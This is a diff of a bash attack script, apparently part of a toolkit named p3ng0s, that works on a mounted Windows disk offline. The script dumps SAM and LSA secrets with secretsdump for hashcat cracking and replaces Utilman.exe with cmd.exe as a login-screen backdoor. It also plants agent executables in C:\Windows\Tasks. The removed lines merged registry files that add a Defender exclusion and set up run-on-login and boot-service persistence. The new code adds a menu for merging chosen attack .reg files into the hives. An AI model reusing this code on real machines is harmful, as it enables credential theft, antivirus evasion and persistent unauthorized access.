@@ -93,16 +93,41 @@ function windows_hashcat_exp() {
     /opt/pentest/impacket/bin/secretsdump.py -sam $LOOT_FOLDER/SAM -system $LOOT_FOLDER/SYSTEM -security $LOOT_FOLDER/SECURITY LOCAL | grep -E '^[^:]+:[^:]+:[^:]+:([a-fA-F0-9]{32}):{3}$' | cut -d: -f4 > $LOOT_FOLDER/hashcat/hash.1000
 }
 
-function windows_exclusion_path_exp() {
-    mkdir -p /mnt/Windows/Tasks/p3ng0s/
-    hivexregedit --merge "/mnt/Windows/System32/config/SOFTWARE" /etc/p3ng0s/os_killer/reg/defender_exclude_persistence.reg
+function windows_registry_exp() {
+    if [ -d "$LOOT_FOLDER/reg/" ]; then
+        local items=()
+        local declare -A file_map
+        local i=1
+        for filepath in "$LOOT_FOLDER/reg"/*.reg; do
+            [[ -f "$filepath" ]] || continue
+            filename=$(basename "$filepath")
+
+            hive=$(echo "$filename" | cut -d'_' -f1)
+            display_name=$(echo "$filename" | sed "s/^${hive}_//" | sed 's/\.reg$//' | tr '-' ' ')
+
+            tag="${filename}"
+            label="[${hive}] ${display_name}"
+
+            file_map["$i"]="$filename"
+            items+=("$i" "[$hive] $display_name")
+            ((i++))
+        done
+        SEL=$(dialog --title "Registry Attack Selector" \
+            --menu "Select attack(s) to apply:" 20 70 10 \
+            "${items[@]}" \
+            2>&1 >/dev/tty)
+
+        filename=$(basename "${file_map[$SEL]}")
+        hive=$(echo "$filename" | cut -d'_' -f1)
+        hivexregedit --merge "/mnt/Windows/System32/config/$hive" "$LOOT_FOLDER/reg/$filename"
+    fi
+    sleep 2 # sleep here to see output if something went wrong
 }
 
 function windows_user_login_exp() {
     if [ -f $LOOT_FOLDER/agent.exe ]; then
         [ ! -d /mnt/Windows/Tasks/p3ng0s/ ] && mkdir -p /mnt/Windows/Tasks/p3ng0s/
         cp $LOOT_FOLDER/agent.exe /mnt/Windows/Tasks/p3ng0s/agent.exe
-        hivexregedit --merge --prefix='HKEY_LOCAL_MACHINE\SOFTWARE' "/mnt/Windows/System32/config/SOFTWARE" /etc/p3ng0s/os_killer/reg/exe_on_user_login.reg
     fi
 }
 
@@ -110,7 +135,6 @@ function windows_boot_service_exp() {
     if [ -f $LOOT_FOLDER/agent.svc.exe ]; then
         [ ! -d /mnt/Windows/Tasks/p3ng0s/ ] && mkdir -p /mnt/Windows/Tasks/p3ng0s/
         cp $LOOT_FOLDER/agent.svc.exe /mnt/Windows/Tasks/p3ng0s/agent.svc.exe
-        hivexregedit --merge --prefix='HKEY_LOCAL_MACHINE\SYSTEM' "/mnt/Windows/System32/config/SYSTEM" /etc/p3ng0s/os_killer/reg/service_start_on_boot.reg
     fi
 }
 
@@ -122,9 +146,9 @@ function windows_exp() {
             2 "r: Dump the hashes to then hashcat them ^^" \
             3 "w: Swap cmd.exe and utilman.exe" \
             4 "rw: Secrets dump me baby right now" \
-            5 "rw: Create defender exclusion path in C:\\Windows\\Tasks\\p3ng0s\\" \
-            6 "rw: Infect on user login (requires: loot/agent.exe)" \
-            7 "rw: Infect on boot as NT Authority/System (requires: loot/agent.svc.exe)" \
+            5 "rw: Registery HIVE Attacks! (requires: loot/reg/*.reg)" \
+            6 "rw: Install agent.exe on target (requires: loot/agent.exe)" \
+            7 "rw: Install agent.svc.exe on target(requires: loot/agent.svc.exe)" \
             2>&1 >/dev/tty)
         EXIT_STATUS=$?
 
@@ -137,7 +161,7 @@ function windows_exp() {
         [ $SEL = 2 ] && windows_hashcat_exp
         [ $SEL = 3 ] && cp -r /mnt/Windows/System32/cmd.exe /mnt/Windows/System32/Utilman.exe
         [ $SEL = 4 ] && /opt/pentest/impacket/bin/secretsdump.py -sam /mnt/Windows/System32/config/SAM -system /mnt/Windows/System32/config/SYSTEM -security /mnt/Windows/System32/config/SECURITY LOCAL | tee >(cat) > $LOOT_FOLDER/secretsdump.log
-        [ $SEL = 5 ] && windows_exclusion_path_exp
+        [ $SEL = 5 ] && windows_registry_exp
         [ $SEL = 6 ] && windows_user_login_exp
         [ $SEL = 7 ] && windows_boot_service_exp
     done
